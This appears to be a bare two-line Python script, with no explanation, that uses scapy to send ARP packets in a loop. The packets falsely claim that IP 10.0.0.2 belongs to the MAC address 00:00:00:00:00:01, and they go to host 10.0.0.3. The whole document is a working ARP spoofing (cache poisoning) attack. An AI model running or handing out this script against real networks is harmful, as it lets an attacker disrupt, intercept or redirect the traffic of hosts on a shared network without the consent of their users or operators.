from scapy.all import *
srloop(ARP(psrc='10.0.0.2',hwsrc='00:00:00:00:00:01',pdst='10.0.0.3',op=1))
